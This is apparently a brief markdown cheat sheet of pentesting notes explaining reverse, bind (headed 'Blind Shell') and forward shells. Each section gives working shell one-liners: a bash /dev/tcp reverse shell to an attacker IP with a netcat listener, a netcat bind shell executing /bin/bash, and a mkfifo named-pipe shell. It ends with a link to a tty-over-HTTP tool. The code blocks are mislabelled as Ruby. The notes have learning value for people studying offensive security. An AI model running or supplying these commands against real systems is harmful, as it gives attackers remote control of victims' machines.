# Reverse Shell

- A technique that allows an attacker to connect to a remote machine from their own machine. It establishes a connection from the compromised machine to the attacker's machine. This is achieved by executing a malicious program or a specific instruction on the remote machine that establishes a connection back to the attacker's machine, allowing them to take control of the remote machine.

```ruby
# On the attacker's machine (IP: 192.168.1.100)
nc -lvnp 4444

# On the victim's machine
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

```

# Blind Shell

- This technique is the opposite of a Reverse Shell. Instead of the compromised machine connecting to the attacker's machine, the attacker connects to the compromised machine. The attacker listens on a specific port, and the compromised machine accepts the incoming connection on that port. The attacker then has console access to the compromised machine, allowing them to take control of it.

```ruby
# On the victim's machine
nc -lvnp 4444 -e /bin/bash

# On the attacker's machine
nc 192.168.1.200 4444
```

# Forward Shell

- This technique is used when Reverse or Bind connections cannot be established due to Firewall rules implemented in the network. It is achieved using mkfifo, which creates a FIFO (named pipe) file that is used as a kind of "simulated console" through which the attacker can operate on the remote machine. Instead of establishing a direct connection, the attacker redirects traffic through the FIFO file, allowing bidirectional communication with the remote machine.

```ruby
# On the victim's machine
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 4444 > /tmp/f

# On the attacker's machine
nc 192.168.1.200 4444

``` 

## Link

```ruby
https://github.com/s4vitar/ttyoverhttp
```
